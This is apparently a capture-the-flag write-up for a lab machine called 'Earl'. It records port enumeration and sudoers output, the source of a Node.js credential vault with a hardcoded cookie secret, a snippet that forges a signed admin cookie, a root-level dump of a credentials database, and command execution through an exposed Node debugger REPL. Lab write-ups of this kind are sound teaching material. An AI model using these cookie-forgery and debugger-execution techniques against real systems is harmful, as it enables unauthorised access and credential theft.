# Earl

## 信息收集

```bash
Detected ss and lsof, executing related commands...
Port: 22, PID: 721
—> Command: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
Port: 3000, PID: 1519
—> Command: /usr/bin/node app.js 
Port: 8000, PID: 1529
—> Command: /usr/bin/python3 server.py 
Port: 9229, PID: 2353
—> Command: /usr/bin/node --inspect-brk=9229 -h 
Port: 1234, PID: 779
—> Command: socat TCP-LISTEN:1234,reuseaddr,fork EXEC:node inspect -h,pty 
Port: 53, PID: 565
—> Command: /lib/systemd/systemd-resolved 

## ———————————————————————————— ##

Nginx is not installed.

## ———————————————————————————— ##

Apache is not installed.

## ———————————————————————————— ##

Checking /etc/sudoers (active configurations only):
  Defaults      env_reset
  Defaults      mail_badpass
  Defaults      secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
  root  ALL=(ALL:ALL) ALL
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
  duke ALL = (root) NOPASSWD: /usr/bin/sqlite3
———
Finding SUID files:
  root  ALL=(ALL:ALL) ALL
  %admin ALL=(ALL) ALL
  %sudo ALL=(ALL:ALL) ALL
  duke ALL = (root) NOPASSWD: /usr/bin/sqlite3
———
Finding files with special capabilities:
  /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
  /usr/bin/mtr-packet = cap_net_raw+ep
  /usr/bin/traceroute6.iputils = cap_net_raw+ep
  /usr/bin/ping = cap_net_raw+ep
———
```

## Port 3000 Nodejs

```javascript title="/home/duke/node/app.js"
const express = require("express");
const cookieParser = require('cookie-parser')
const crypto = require('crypto');
const db = require('better-sqlite3')('/opt/credentials.db', {});

const app = express();
const secret = '5b011d9e8a36fa05832f9c3032d10123';
app.use(cookieParser(secret));

let credentials = { };

const hash = (token) => crypto.createHash('md5').update(token).digest('hex');

const data = db.prepare('SELECT * FROM credentials').all();
for(let i = 0; i < data.length; i++) {
        if(!credentials[data[i].user]) {
                credentials[data[i].user] = {};
        }
        credentials[data[i].user][data[i].info] = data[i].password;
}

app.get('/', (req, res) => {
        if (!req.signedCookies.user)
                res.cookie('user', { admin: false }, { signed: true });

        res.sendFile(__dirname + "/index.html");
});

app.get('/api/addCredentials', (req, res) => {
        if(!req.signedCookies.user) {
                res.json({"msg" : "Not logged in"});
                return;
        }
        let { username, password, info } = req.query;
        if (username && password && info) {
                if(!credentials[username]) {
                        credentials[username] = {};
                }
                credentials[username][info] = password;
        }
        res.json({"msg" : "Credentials saved"});
});

app.get('/api/vault', (req, res) => {
        let user = { isAdmin: false };
        if(req.signedCookies.admin === true) {
                user.passcode = "c00d2d9e92e77a00107454ea2439fe84";
                user.isAdmin = true;
        }

        if (req.query.passcode && hash(req.query.passcode) === user.passcode) {
                res.json(credentials);
        } else {
                res.json({"msg" : "Incorrect passcode"});
        }

});

app.listen(3000, "0.0.0.0");
```

可能的攻击方式

```javascript
const cookieParser = require('cookie-parser');
const express = require('express');
const app = express();
const secret = '20945';
app.use(cookieParser(secret));

const userCookie = { admin: true };
const signedCookie = 's:' + Buffer.from(JSON.stringify(userCookie)).toString('base64') + '.' + crypto.createHmac('sha256', secret).update(JSON.stringify(userCookie)).digest('base64');
console.log('Signed Cookie:', signedCookie);
```

## Port 8000 Python

```python title="/home/duke/py"
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sqlite3

conn = sqlite3.connect('/opt/credentials.db')
data = conn.execute("SELECT * FROM credentials")
passwords = data.fetchall()

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/passwords':
            if self.client_address[0] != '127.0.0.1':
                res = "Invalid remote client"
                self.send_response(403)
                self.end_headers()
                self.wfile.write(res.encode())
                return
            else:
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(self.passwords).encode())
                return
        if self.path == '/addCredentials':
            res = "Service Disabled"
            self.send_response(403)
            self.end_headers()
            self.wfile.write(res.encode())
            return
        if self.path == '/':
            res = "Password Manager (Deprecated)"
            self.send_response(403)
            self.end_headers()
            self.wfile.write(res.encode())
            return
        else:
            res = ('Path' + self.path + ' does not exist\n').format(site=self)
            self.send_response(404)
            self.send_header('content-type', 'text/html')
            self.end_headers()
            self.wfile.write(res.encode())
            return

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
```

限制了仅本地才可访问，估计是用来提权的

```bash
sqlite> .table
(remote) root@htb:/home/duke/py# sqlite3 /opt/credentials.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .table
credentials
sqlite> select * from credentials;
duke|work|f0f7f79a275a83bfe8769dfd81d40bb2
duke|Windows|pass123
sam|Facebook|Test123!
```

## Port 1234 node inspect

可能通过 console 命令实现任意命令执行

```plaintext
debug> repl
Press Ctrl+C to leave debug repl
> require('child_process').execSync('whoami').toString()
```
